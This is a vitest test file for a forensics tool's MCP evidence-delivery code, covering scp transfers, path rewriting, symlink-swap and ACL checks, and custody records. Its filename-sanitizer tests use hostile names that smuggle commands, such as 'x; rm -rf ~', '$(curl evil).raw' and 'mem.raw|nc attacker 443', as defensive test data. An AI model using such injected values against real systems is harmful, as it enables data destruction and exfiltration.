import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import {
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  readdir,
  stat,
  utimes,
  writeFile,
  rm,
  symlink,
} from "node:fs/promises";
import { createHash } from "node:crypto";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
  deliver,
  rewriteToRemote,
  safeRemoteName,
  shellQuote,
  spawnTransferRunner,
  type TransferRunner,
  type TransferResult,
  type DeliverySource,
} from "../../src/integrations/mcp/mcpDelivery.js";
import { SPLIT_UTF8_TEXT, splitUtf8Script } from "../helpers/splitUtf8.js";
import { aclStub, type StubAce } from "../helpers/aclStub.js";
import {
  DEFAULT_DELIVERY,
  type McpServer,
  type McpDelivery,
} from "../../src/integrations/mcp/mcpServerStore.js";

interface Call {
  binary: string;
  args: string[];
  timeoutMs: number;
  signal?: AbortSignal;
}

let calls: Call[];
let nextResult: TransferResult;

const runner: TransferRunner = async (binary, args, opts) => {
  calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
  return nextResult;
};

const server = (delivery: Partial<McpDelivery> = {}): McpServer => ({
  id: "sift-mcp",
  label: "SIFT",
  enabled: true,
  allowedTools: [],
  allowedCommands: [],
  agentEnabled: false,
  timeoutMs: 300_000,
  delivery: { ...DEFAULT_DELIVERY, ...delivery },
});

const SCP = { mode: "scp" as const, host: "sift.example.com", user: "analyst", remoteDir: "/cases/incoming" };

// A real case folder: delivery opens the file through the case-file guard and sends a snapshot.
let root: string;
let MEM: string;
let source: DeliverySource;
const MEM_BYTES = "memory-image-bytes";

beforeEach(async () => {
  calls = [];
  nextResult = { stdout: "", stderr: "", code: 0 };
  root = await mkdtemp(join(tmpdir(), "dfir-mcp-deliver-"));
  await mkdir(join(root, "c1", "imports"), { recursive: true });
  MEM = join(root, "c1", "imports", "mem.raw");
  await writeFile(MEM, MEM_BYTES);
  source = { casesRoot: root, caseDir: join(root, "c1"), stagingDir: join(root, ".export-staging") };
});

// A private folder on Windows: no entry for any broad principal. Keeps team-mode tests off the CI disk ACL.
const privateAcl = aclStub();

const REMOTE = /^\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/;

describe("safeRemoteName", () => {
  it("keeps an ordinary evidence filename recognizable", () => {
    expect(safeRemoteName("/cases/c1/imports/memory.raw")).toBe("memory.raw");
  });

  // ssh runs its remote argument through a shell, and filenames come from evidence.
  it("strips shell metacharacters out of a hostile filename", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~").replace(/_+$/, "")).toBe("x_rm_-rf");
    expect(safeRemoteName("/cases/c1/$(curl evil).raw")).toBe("_curl_evil_.raw");
    expect(safeRemoteName("/cases/c1/`whoami`")).toBe("_whoami_");
    expect(safeRemoteName("mem.raw|nc attacker 443")).toBe("mem.raw_nc_attacker_443");
  });

  // basename() discards everything up to the last separator, so a payload with a slash in it is
  // mostly gone before sanitizing even runs. The remainder still has to be safe.
  it("keeps only the last path segment", () => {
    expect(safeRemoteName("/cases/c1/x; rm -rf ~/.ssh")).toBe(".ssh");
  });

  it("never yields a name that is only dots", () => {
    expect(safeRemoteName("/cases/c1/..")).toBe("evidence.dat");
    expect(safeRemoteName("/cases/c1/.")).toBe("evidence.dat");
  });

  it("bounds the length", () => {
    expect(safeRemoteName(`/cases/${"a".repeat(300)}`)).toHaveLength(120);
  });
});

describe("shellQuote", () => {
  it("wraps a value so a shell sees one word", () => {
    expect(shellQuote("/cases/a b")).toBe("'/cases/a b'");
  });

  it("escapes an embedded single quote", () => {
    expect(shellQuote("it's")).toBe(`'it'\\''s'`);
  });
});

describe("rewriteToRemote", () => {
  it("passes the path through when the mount is at the same place on both sides", () => {
    expect(rewriteToRemote(server(), "/evidence/mem.raw")).toBe("/evidence/mem.raw");
  });

  it("swaps the local prefix for the remote one", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "/srv/cases/c1/imports/mem.raw")).toBe("/mnt/dfir/c1/imports/mem.raw");
  });

  it("refuses a path the analysis host cannot reach", () => {
    const s = server({ localPrefix: "/srv/cases", remotePrefix: "/mnt/dfir" });
    expect(() => rewriteToRemote(s, "/home/analyst/mem.raw")).toThrow(/not under this server's local prefix/);
  });

  it("produces a POSIX path from a Windows-style local path", () => {
    const s = server({ localPrefix: "C:\\cases", remotePrefix: "/mnt/dfir" });
    expect(rewriteToRemote(s, "C:\\cases\\c1\\mem.raw")).toBe("/mnt/dfir/c1/mem.raw");
  });
});

describe("deliver — remote-path mode", () => {
  it("hands back the rewritten path and copies nothing", async () => {
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });

    const target = await deliver(s, MEM, { runner, source, teamMode: false });

    expect(target.remotePath).toBe("/mnt/dfir/c1/imports/mem.raw");
    expect(calls).toHaveLength(0);
    expect(target.cleanup).toBeUndefined(); // nothing was staged, so nothing to remove
  });

  // Nothing moves, but the evidence is handed to another system to read.
  it("still records a custody transfer", async () => {
    const seen: string[] = [];
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });

    await deliver(s, MEM, {
      runner,
      source,
      teamMode: false,
      recordTransfer: async (d) => {
        seen.push(d);
      },
    });

    expect(seen).toEqual(["SIFT (shared path /mnt/dfir/c1/imports/mem.raw)"]);
  });

  // #1847: nothing is read here, but a link is refused before the path is handed over.
  it.skipIf(process.platform === "win32")("refuses a target swapped for a link to another case", async () => {
    await mkdir(join(root, "c2"), { recursive: true });
    await writeFile(join(root, "c2", "case.json"), "other-case-secret");
    await rm(MEM);
    await symlink(join(root, "c2", "case.json"), MEM);
    const seen: string[] = [];
    const s = server({ localPrefix: root, remotePrefix: "/mnt/dfir" });
    await expect(
      deliver(s, MEM, { runner, source, teamMode: false, recordTransfer: async (d) => void seen.push(d) }),
    ).rejects.toThrow(/symlink detected/);
    expect(seen).toEqual([]);
  });
});

// #1856: in team mode a second writer could swap the case path for a link after the check, and the
// analysis host opens the name later. So team mode hands over a private copy on the share instead.
describe("deliver — remote-path in team mode (#1856)", () => {
  const PREFIXED = { localPrefix: "", remotePrefix: "" };
  const SNAP = /^\/mnt\/dfir\/\.mcp-delivery\/delivery-[^/]+\/[0-9a-f]{12}_mem\.raw$/;
  const local = (remotePath: string): string =>
    join(root, ...remotePath.slice("/mnt/dfir/".length).split("/"));
  const deliveryRoot = (): string => join(root, ".mcp-delivery");
  const listDelivery = async (): Promise<string[]> => readdir(deliveryRoot()).catch(() => []);
  const sha = (text: string): string => createHash("sha256").update(text).digest("hex");
  beforeEach(() => {
    PREFIXED.localPrefix = root;
    PREFIXED.remotePrefix = "/mnt/dfir";
  });

  it("copies the file to a hidden delivery folder on the share and hands over that path", async () => {
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
    });

    expect(target.remotePath).toMatch(SNAP);
    expect(await readFile(local(target.remotePath), "utf8")).toBe(MEM_BYTES);
    expect(target.destination).toBe(`SIFT (copied to shared path ${target.remotePath})`);
    expect(calls).toHaveLength(0);
    expect(target.cleanup).toBeTypeOf("function");
    await target.cleanup?.();
  });

  it("a swap of the case path after delivery does not change what the host reads", async () => {
    await mkdir(join(root, "c2"), { recursive: true });
    await writeFile(join(root, "c2", "case.json"), "other-case-secret");
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
    });

    await rm(MEM);
    if (process.platform === "win32") await writeFile(MEM, "other-case-secret");
    else await symlink(join(root, "c2", "case.json"), MEM);

    expect(await readFile(local(target.remotePath), "utf8")).toBe(MEM_BYTES);
    await target.cleanup?.();
  });

  it("records custody with the hash of the copy that was handed over", async () => {
    const seen: { destination: string; sent?: { sha256: string } }[] = [];
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
      recordTransfer: async (destination, sent) => void seen.push({ destination, sent }),
    });

    expect(seen).toEqual([{ destination: target.destination, sent: { sha256: sha(MEM_BYTES) } }]);
    await target.cleanup?.();
  });

  it("removes the copy after the run", async () => {
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
    });
    expect(await listDelivery()).toHaveLength(1);

    await target.cleanup?.();

    expect(await listDelivery()).toEqual([]);
  });

  it("removes the copy when the custody record fails, and the error still reaches the caller", async () => {
    await expect(
      deliver(server(PREFIXED), MEM, {
        runner,
        source,
        teamMode: true,
        aclRunner: privateAcl,
        recordTransfer: async () => {
          throw new Error("custody store offline");
        },
      }),
    ).rejects.toThrow(/custody store offline/);

    expect(await listDelivery()).toEqual([]);
  });

  it("leaves nothing behind when the delivery is cancelled", async () => {
    const controller = new AbortController();
    controller.abort();
    await expect(
      deliver(server(PREFIXED), MEM, {
        runner,
        source,
        teamMode: true,
        aclRunner: privateAcl,
        signal: controller.signal,
      }),
    ).rejects.toThrow();

    expect(await listDelivery()).toEqual([]);
  });

  it("puts the copy under the cases root when the mount has the same path on both sides", async () => {
    const target = await deliver(server(), MEM, { runner, source, teamMode: true, aclRunner: privateAcl });

    expect(dirname(dirname(target.remotePath))).toBe(deliveryRoot());
    expect(await readFile(target.remotePath, "utf8")).toBe(MEM_BYTES);
    await target.cleanup?.();
  });

  it("refuses when the cases root is not inside the local prefix, and copies nothing", async () => {
    const s = server({ localPrefix: join(root, "c1"), remotePrefix: "/mnt/c1" });

    await expect(deliver(s, MEM, { runner, source, teamMode: true, aclRunner: privateAcl })).rejects.toThrow(
      /cases root.*local prefix/,
    );
    expect(await listDelivery()).toEqual([]);
  });

  it.skipIf(process.platform === "win32")("refuses a delivery folder that is a link", async () => {
    const elsewhere = await mkdtemp(join(tmpdir(), "dfir-mcp-elsewhere-"));
    await symlink(elsewhere, deliveryRoot());

    await expect(
      deliver(server(PREFIXED), MEM, { runner, source, teamMode: true, aclRunner: privateAcl }),
    ).rejects.toThrow(/delivery folder/);
    expect(await readdir(elsewhere)).toEqual([]);
  });

  it.skipIf(process.platform === "win32")(
    "refuses a delivery folder other users can write, and copies nothing",
    async () => {
      await mkdir(deliveryRoot());
      await chmod(deliveryRoot(), 0o777);
      // A folder this process cannot tighten (a 0777 CIFS mount) — simulated by a chmod that fails.
      await expect(
        deliver(server(PREFIXED), MEM, {
          runner,
          source,
          teamMode: true,
          aclRunner: privateAcl,
          chmod: async () => {
            throw new Error("EPERM");
          },
        }),
      ).rejects.toThrow(/other users can write/);
      expect(await listDelivery()).toEqual([]);
    },
  );

  it.skipIf(process.platform === "win32")(
    "refuses when other users can write the cases root, unless the sticky bit is set",
    async () => {
      await chmod(root, 0o777);
      await expect(
        deliver(server(PREFIXED), MEM, { runner, source, teamMode: true, aclRunner: privateAcl }),
      ).rejects.toThrow(/other users can write the cases root/);
      expect(await listDelivery()).toEqual([]);

      await chmod(root, 0o1777);
      const target = await deliver(server(PREFIXED), MEM, {
        runner,
        source,
        teamMode: true,
        aclRunner: privateAcl,
      });
      await target.cleanup?.();
      await chmod(root, 0o700);
    },
  );

  it.skipIf(process.platform === "win32")("opens a delivery folder the umask made private", async () => {
    await mkdir(deliveryRoot());
    await chmod(deliveryRoot(), 0o700);
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
    });

    expect((await stat(deliveryRoot())).mode & 0o777).toBe(0o755);
    await target.cleanup?.();
  });

  it.skipIf(process.platform === "win32")("tightens a delivery folder it owns", async () => {
    await mkdir(deliveryRoot());
    await chmod(deliveryRoot(), 0o777);
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
    });

    expect((await stat(deliveryRoot())).mode & 0o777).toBe(0o755);
    await target.cleanup?.();
  });

  it.skipIf(process.platform === "win32")(
    "the copy is never readable by more users than the original",
    async () => {
      await chmod(MEM, 0o640);
      const target = await deliver(server(PREFIXED), MEM, {
        runner,
        source,
        teamMode: true,
        aclRunner: privateAcl,
      });

      expect((await stat(local(target.remotePath))).mode & 0o777).toBe(0o440);
      expect((await stat(dirname(local(target.remotePath)))).mode & 0o777).toBe(0o750);
      await target.cleanup?.();
    },
  );

  // The day-old staging sweep must not remove a copy the analysis host is still reading.
  it("keeps the copy's folder fresh while the run lasts", async () => {
    const target = await deliver(server(PREFIXED), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: privateAcl,
      keepAliveMs: 10,
    });
    const folder = dirname(local(target.remotePath));
    const old = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
    await utimes(folder, old, old);

    await new Promise((r) => setTimeout(r, 80));

    expect((await stat(folder)).mtimeMs).toBeGreaterThan(Date.now() - 60_000);
    await target.cleanup?.();
  });

  it("single-user mode still copies nothing", async () => {
    const target = await deliver(server(PREFIXED), MEM, { runner, source, teamMode: false });

    expect(target.remotePath).toBe("/mnt/dfir/c1/imports/mem.raw");
    expect(target.destination).toBe("SIFT (shared path /mnt/dfir/c1/imports/mem.raw)");
    expect(target.cleanup).toBeUndefined();
    await expect(stat(deliveryRoot())).rejects.toThrow();
  });
});

// #1863: on Windows, mode bits say nothing — the ACLs of the cases root and the delivery folder are read
// by SID and a write right for a broad principal is refused, with the same words as on POSIX.
describe("deliver — team mode on Windows checks the folder ACLs (#1863)", () => {
  const EVERYONE_FULL: StubAce = { s: "S-1-1-0", r: 0x1f01ff, t: 0 };
  const USERS_MODIFY: StubAce = { s: "S-1-5-32-545", r: 0x301bf, t: 0 };
  const shared = () => ({ localPrefix: root, remotePrefix: "/mnt/dfir" });
  const deliveryRoot = (): string => join(root, ".mcp-delivery");
  const listDelivery = async (): Promise<string[]> => readdir(deliveryRoot()).catch(() => []);
  const failing =
    (why: string): TransferRunner =>
    async () => {
      throw new Error(why);
    };

  describe("on a simulated win32", () => {
    const real = Object.getOwnPropertyDescriptor(process, "platform")!;
    beforeEach(() => {
      Object.defineProperty(process, "platform", { ...real, value: "win32" });
    });
    afterEach(() => {
      Object.defineProperty(process, "platform", real);
    });

    it("refuses a cases root Everyone can write, and copies nothing", async () => {
      const aclRunner = aclStub((p) => (p === root ? [EVERYONE_FULL] : []));

      await expect(
        deliver(server(shared()), MEM, { runner, source, teamMode: true, aclRunner }),
      ).rejects.toThrow(/other users can write the cases root .*Everyone/);
      expect(await listDelivery()).toEqual([]);
    });

    it("refuses a delivery folder Users can modify", async () => {
      const aclRunner = aclStub((p) => (p === deliveryRoot() ? [USERS_MODIFY] : []));

      await expect(
        deliver(server(shared()), MEM, { runner, source, teamMode: true, aclRunner }),
      ).rejects.toThrow(/other users can write the MCP delivery folder .*Users/);
      expect(await listDelivery()).toEqual([]);
    });

    it("reads both folders in one call and delivers when neither is writable by others", async () => {
      const seen: string[][] = [];
      const aclRunner = aclStub(() => [{ s: "S-1-5-32-545", r: 0x200a9, t: 0 }], seen);

      const target = await deliver(server(shared()), MEM, { runner, source, teamMode: true, aclRunner });

      expect(seen).toEqual([[root, deliveryRoot()]]);
      expect(target.destination).toMatch(/copied to shared path/);
      expect(calls).toHaveLength(0);
      await target.cleanup?.();
    });

    it.each([
      ["PowerShell is missing", failing('cannot run "powershell.exe": spawn powershell.exe ENOENT')],
      ["PowerShell times out", failing("powershell.exe timed out after 30000ms")],
      ["PowerShell exits non-zero", async () => ({ code: 1, stdout: "", stderr: "denied" })],
      ["the output is not an ACL", async () => ({ code: 0, stdout: "oops", stderr: "" })],
    ])("fails closed when %s", async (_why, aclRunner) => {
      await expect(
        deliver(server(shared()), MEM, { runner, source, teamMode: true, aclRunner }),
      ).rejects.toThrow(/cannot read the Windows permissions/);
      expect(await listDelivery()).toEqual([]);
    });

    it("single-user mode reads no ACL", async () => {
      const seen: string[][] = [];
      const target = await deliver(server(shared()), MEM, {
        runner,
        source,
        teamMode: false,
        aclRunner: aclStub(() => [EVERYONE_FULL], seen),
      });

      expect(target.cleanup).toBeUndefined();
      expect(seen).toEqual([]);
    });
  });

  it.skipIf(process.platform === "win32")("POSIX reads no ACL", async () => {
    const seen: string[][] = [];
    const target = await deliver(server(shared()), MEM, {
      runner,
      source,
      teamMode: true,
      aclRunner: aclStub(() => [EVERYONE_FULL], seen),
    });

    expect(seen).toEqual([]);
    await target.cleanup?.();
  });

  // A real ACL on the Windows CI shards: a private cases root is accepted, and one Everyone can modify
  // is refused. The default runner spawns the real powershell.exe.
  it.runIf(process.platform === "win32")(
    "reads a real Windows ACL: private is accepted, Everyone-modify is refused",
    async () => {
      const casesRoot = await mkdtemp(join(tmpdir(), "dfir-acl-"));
      const csv = execFileSync("whoami", ["/user", "/fo", "csv", "/nh"], {
        encoding: "utf8",
        stdio: ["ignore", "pipe", "pipe"],
      });
      const sid = /"(S-1-[0-9-]+)"/.exec(csv)?.[1];
      expect(sid).toBeDefined();
      execFileSync("icacls", [casesRoot, "/inheritance:r", "/grant:r", `*${sid}:(OI)(CI)F`], {
        stdio: ["ignore", "pipe", "pipe"],
      });
      await mkdir(join(casesRoot, "c1", "imports"), { recursive: true });
      const mem = join(casesRoot, "c1", "imports", "mem.raw");
      await writeFile(mem, MEM_BYTES);
      const src = {
        casesRoot,
        caseDir: join(casesRoot, "c1"),
        stagingDir: join(casesRoot, ".export-staging"),
      };
      const s = server({ localPrefix: casesRoot, remotePrefix: "/mnt/dfir" });

      const target = await deliver(s, mem, { runner, source: src, teamMode: true });
      expect(target.destination).toMatch(/copied to shared path/);
      await target.cleanup?.();

      execFileSync("icacls", [casesRoot, "/grant", "*S-1-1-0:(OI)(CI)M"], {
        stdio: ["ignore", "pipe", "pipe"],
      });
      await expect(deliver(s, mem, { runner, source: src, teamMode: true })).rejects.toThrow(
        /other users can write the cases root .*Everyone/,
      );
    },
    60_000,
  );
});

describe("deliver — scp mode", () => {
  it("pushes the file and returns the staged remote path", async () => {
    const target = await deliver(server(SCP), MEM, { runner, source, teamMode: false });

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("scp");
    const [o, batch, dashes, sent, dest] = calls[0].args;
    expect([o, batch, dashes]).toEqual(["-o", "BatchMode=yes", "--"]);
    // A snapshot in its own staging folder, never the case path itself (#1847).
    expect(sent.startsWith(join(root, ".export-staging"))).toBe(true);
    expect(sent).not.toBe(MEM);
    expect(target.remotePath).toMatch(REMOTE);
    expect(dest).toBe(`analyst@sift.example.com:${target.remotePath}`);
    expect(target.destination).toBe(`analyst@sift.example.com:${target.remotePath}`);
  });

  // BatchMode on and StrictHostKeyChecking untouched: an unknown host fails closed rather than
  // trusting whatever answered the address.
  it("never prompts and never disables host-key checking", async () => {
    await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    const args = calls[0].args.join(" ");
    expect(args).toContain("BatchMode=yes");
    expect(args).not.toContain("StrictHostKeyChecking");
  });

  it("passes an identity file and a non-default port", async () => {
    await deliver(server({ ...SCP, identityFile: "/home/dfir/.ssh/lab", port: 2222 }), MEM, {
      source,
      teamMode: false,
      runner,
    });
    expect(calls[0].args.slice(0, 7)).toEqual([
      "-o",
      "BatchMode=yes",
      "-i",
      "/home/dfir/.ssh/lab",
      "-P",
      "2222",
      "--",
    ]);
  });

  it("omits the port flag when it is the default", async () => {
    await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    expect(calls[0].args).not.toContain("-P");
  });

  it("uses a bare host when no user is configured", async () => {
    await deliver(server({ ...SCP, user: "" }), MEM, { runner, source, teamMode: false });
    expect(calls[0].args.at(-1)).toMatch(/^sift\.example\.com:\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/);
  });

  it("sanitizes the remote filename rather than trusting the evidence name", async () => {
    const hostile = join(root, "c1", "imports", "x; rm -rf ~");
    await writeFile(hostile, "x");
    const target = await deliver(server(SCP), hostile, { runner, source, teamMode: false });
    expect(target.remotePath).toMatch(/^\/cases\/incoming\/[0-9a-f]{12}_x_rm_-rf_$/);
  });

  it("uses the delivery timeout, not the call timeout", async () => {
    await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    expect(calls[0].timeoutMs).toBe(3_600_000);
  });

  it("threads the cancel signal into the transfer", async () => {
    const controller = new AbortController();
    await deliver(server(SCP), MEM, { runner, source, teamMode: false, signal: controller.signal });
    expect(calls[0].signal).toBe(controller.signal);
  });

  it("reports byte progress by polling the staged file size over SSH", async () => {
    const localPath = MEM;
    await writeFile(localPath, Buffer.alloc(1024));
    const progress: Array<[number, number]> = [];
    const pollingRunner: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs, signal: opts.signal });
      if (binary === "scp") {
        await new Promise((resolve) => setTimeout(resolve, 30));
        return { stdout: "", stderr: "", code: 0 };
      }
      return { stdout: "512\n", stderr: "", code: 0 };
    };
    try {
      await deliver(server(SCP), localPath, {
        runner: pollingRunner,
        source,
        teamMode: false,
        progressIntervalMs: 5,
        onProgress: (done, total) => {
          progress.push([done, total]);
        },
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }

    expect(calls.some((c) => c.binary === "ssh" && c.args.includes("stat"))).toBe(true);
    expect(progress[0]).toEqual([0, 1024]);
    expect(progress).toContainEqual([512, 1024]);
    expect(progress.at(-1)).toEqual([1024, 1024]);
  });

  it("fails with what scp said when the copy fails", async () => {
    nextResult = { stdout: "", stderr: "Host key verification failed.\n", code: 1 };

    await expect(deliver(server(SCP), MEM, { runner, source, teamMode: false })).rejects.toThrow(
      /scp to analyst@sift\.example\.com:.*failed \(exit 1\): Host key verification failed\./,
    );
  });

  it("records a custody transfer naming where the bytes went", async () => {
    const seen: string[] = [];
    await deliver(server(SCP), MEM, {
      source,
      teamMode: false,
      runner,
      recordTransfer: async (d) => {
        seen.push(d);
      },
    });
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatch(/^analyst@sift\.example\.com:\/cases\/incoming\/[0-9a-f]{12}_mem\.raw$/);
  });

  // A failed transfer moved nothing, so the chain must not claim it did.
  it("records no custody transfer when the copy failed", async () => {
    nextResult = { stdout: "", stderr: "no route to host", code: 255 };
    const seen: string[] = [];

    await expect(
      deliver(server(SCP), MEM, {
        source,
        teamMode: false,
        runner,
        recordTransfer: async (d) => {
          seen.push(d);
        },
      }),
    ).rejects.toThrow();

    expect(seen).toEqual([]);
  });
});

// #1847: scp opened the case path by name, so a swap sent another file; and a failed custody record
// left the remote copy behind. Now scp sends a snapshot of the judged handle, and every failure after
// scp started removes the remote copy.
describe("deliver — scp sends a snapshot of the checked file (#1847)", () => {
  const staged = async (): Promise<string[]> => readdir(source.stagingDir).catch(() => []);
  const rmCalls = () => calls.filter((c) => c.binary === "ssh" && c.args.includes("rm"));

  it("scp reads the snapshot's bytes, and a swap of the case path after the check changes nothing", async () => {
    await mkdir(join(root, "c2"), { recursive: true });
    await writeFile(join(root, "c2", "case.json"), "other-case-secret");
    let sentBytes = "";
    const swapping: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs });
      if (binary === "scp") {
        // The attacker swaps the case path while scp runs; scp holds only the snapshot path.
        await rm(MEM);
        if (process.platform !== "win32") await symlink(join(root, "c2", "case.json"), MEM);
        sentBytes = await readFile(args.at(-2)!, "utf8");
      }
      return { stdout: "", stderr: "", code: 0 };
    };
    const sent: string[] = [];
    await deliver(server(SCP), MEM, {
      runner: swapping,
      source,
      teamMode: false,
      recordTransfer: async (_d, info) => void sent.push(info!.sha256),
    });
    expect(sentBytes).toBe(MEM_BYTES);
    expect(sent).toEqual([createHash("sha256").update(MEM_BYTES).digest("hex")]);
    expect(await staged()).toEqual([]);
  });

  it.skipIf(process.platform === "win32")(
    "refuses a case path already swapped for a link; scp never runs",
    async () => {
      await mkdir(join(root, "c2"), { recursive: true });
      await writeFile(join(root, "c2", "case.json"), "other-case-secret");
      await rm(MEM);
      await symlink(join(root, "c2", "case.json"), MEM);
      await expect(deliver(server(SCP), MEM, { runner, source, teamMode: false })).rejects.toThrow(
        /symlink detected/,
      );
      expect(calls).toEqual([]);
      expect(await staged()).toEqual([]);
    },
  );

  it("removes the remote copy when the custody record fails, and the error still reaches the caller", async () => {
    await expect(
      deliver(server(SCP), MEM, {
        runner,
        source,
        teamMode: false,
        recordTransfer: async () => {
          throw new Error("custody log unwritable");
        },
      }),
    ).rejects.toThrow("custody log unwritable");
    expect(rmCalls()).toHaveLength(1);
    const scpDest = calls.find((c) => c.binary === "scp")!.args.at(-1)!;
    expect(rmCalls()[0].args.at(-1)).toBe(`'${scpDest.split(":")[1]}'`);
    expect(await staged()).toEqual([]);
  });

  it("removes a partial remote copy when scp fails", async () => {
    nextResult = { stdout: "", stderr: "connection reset", code: 1 };
    await expect(deliver(server(SCP), MEM, { runner, source, teamMode: false })).rejects.toThrow(
      /scp to .* failed/,
    );
    expect(rmCalls()).toHaveLength(1);
    expect(await staged()).toEqual([]);
  });

  it("says so when the remote copy cannot be removed after a failure", async () => {
    const failing: TransferRunner = async (binary, args, opts) => {
      calls.push({ binary, args, timeoutMs: opts.timeoutMs });
      return binary === "scp" ? { stdout: "", stderr: "", code: 0 } : { stdout: "", stderr: "", code: 255 };
    };
    await expect(
      deliver(server(SCP), MEM, {
        runner: failing,
        source,
        teamMode: false,
        recordTransfer: async () => {
          throw new Error("custody log unwritable");
        },
      }),
    ).rejects.toThrow(/custody log unwritable — and the copy at .* could not be removed/);
  });

  it("two deliveries of the same file never share a remote name", async () => {
    const a = await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    const b = await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    expect(a.remotePath).not.toBe(b.remotePath);
  });
});

describe("deliver — scp cleanup", () => {
  it("removes the staged copy over ssh, with the path quoted", async () => {
    const target = await deliver(server(SCP), MEM, { runner, source, teamMode: false });
    calls.length = 0;

    await target.cleanup?.();

    expect(calls).toHaveLength(1);
    expect(calls[0].binary).toBe("ssh");
    expect(calls[0].args).toEqual([
      "-o",
      "BatchMode=yes",
      "analyst@sift.example.com",
      "rm",
      "-f",
      "--",
      `'${target.remotePath}'`,
    ]);
  });

  it("passes the non-default port with ssh's lowercase flag", async () => {
    const target = await deliver(server({ ...SCP, port: 2222 }), MEM, { runner, source, teamMode: false });
    calls.length = 0;
    await target.cleanup?.();
    expect(calls[0].args).toContain("-p");
    expect(calls[0].args).toContain("2222");
  });

  // Failing an analysis whose result already arrived, over a leftover temp file, helps nobody.
  it("swallows a failed cleanup", async () => {
    // Copies fine, but the box is gone by the time we try to tidy up.
    const flaky: TransferRunner = async (binary) => {
      if (binary === "ssh") throw new Error("connection lost");
      return { stdout: "", stderr: "", code: 0 };
    };
    const target = await deliver(server(SCP), MEM, { runner: flaky, source, teamMode: false });

    await expect(target.cleanup?.()).resolves.toBeUndefined();
  });
});

// A real spawn against `node -e`, so this exercises the actual pipe/collect path rather than the
// injected runner every test above uses. scp is quiet on success and terse on failure, so stderr is
// the whole diagnostic an operator gets — and a remote path with a non-ASCII name is exactly what
// appears in it.
// #1847: the caller removes the remote copy right after a stopped transfer settles, so the transfer
// must have exited by then — an scp still running could write the copy again after the removal.
describe("spawnTransferRunner stop", () => {
  it.skipIf(process.platform === "win32")(
    "settles a cancelled transfer only after the child exits",
    async () => {
      const marker = join(root, "exited");
      const script = `process.on("SIGTERM", () => setTimeout(() => { require("fs").writeFileSync(${JSON.stringify(marker)}, "x"); process.exit(0); }, 300)); setInterval(() => {}, 1000);`;
      const controller = new AbortController();
      const run = spawnTransferRunner()(process.execPath, ["-e", script], {
        timeoutMs: 30_000,
        signal: controller.signal,
      });
      setTimeout(() => controller.abort(), 200);
      await expect(run).rejects.toThrow(/cancelled/);
      expect(await readFile(marker, "utf8")).toBe("x");
    },
    10_000,
  );
});

describe("spawnTransferRunner output decoding", () => {
  it("reassembles a character split across two stderr chunks", async () => {
    const r = await spawnTransferRunner()(process.execPath, ["-e", splitUtf8Script({ stream: "stderr" })], {
      timeoutMs: 10_000,
    });
    expect(r.stderr).toBe(SPLIT_UTF8_TEXT);
  });

  it("reassembles a character split across two stdout chunks", async () => {
    const r = await spawnTransferRunner()(process.execPath, ["-e", splitUtf8Script()], { timeoutMs: 10_000 });
    expect(r.stdout).toBe(SPLIT_UTF8_TEXT);
  });
});
